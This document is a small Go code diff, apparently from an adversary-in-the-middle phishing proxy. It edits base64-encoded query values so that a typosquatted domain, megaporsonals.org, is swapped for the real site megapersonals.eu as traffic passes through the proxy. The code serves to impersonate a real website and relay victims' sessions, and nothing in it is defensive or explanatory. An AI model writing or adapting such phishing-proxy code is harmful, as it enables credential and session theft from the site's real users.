@@ -421,8 +421,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-							if qs[gp][i] == "aHR0cHM6Ly9tZWdhcG9yc29uYWxzLm9yZzo0NDM" { // https://megaporsonals.org:443
-								qs[gp][i] = "aHR0cHM6Ly9tZWdhcGVyc29uYWxzLmV1OjQ0Mw" // https://megapersonals.eu:443
+							if qs[gp][i] == "aHR0cHM6Ly9tZWdhcG9yc29uYWxzLm9yZzo0NDM." { // https://megaporsonals.org:443
+								qs[gp][i] = "aHR0cHM6Ly9tZWdhcGVyc29uYWxzLmV1OjQ0Mw." // https://megapersonals.eu:443
 							}
 							}
 						}
